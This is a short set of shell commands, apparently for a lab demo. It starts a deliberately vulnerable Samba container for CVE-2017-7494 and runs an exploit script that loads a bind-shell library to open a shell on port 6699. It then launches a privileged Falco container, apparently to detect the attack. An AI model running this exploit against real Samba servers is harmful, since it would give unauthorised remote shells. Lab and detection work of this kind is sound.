docker network create smbnet

docker run --rm -ti --name samba --network smbnet -p 137-139:137-139 -p 445:445 -p 6699:6699 vulnerables/cve-2017-7494

docker run --rm -ti --name exploit --network smbnet bencer/sambacry

./exploit.py -t samba -e libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699

docker run --rm -ti --name falco --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro -v ${PWD}/falco_rules.local.yaml:/etc/falco/falco_rules.local.yaml:ro sysdig/falco
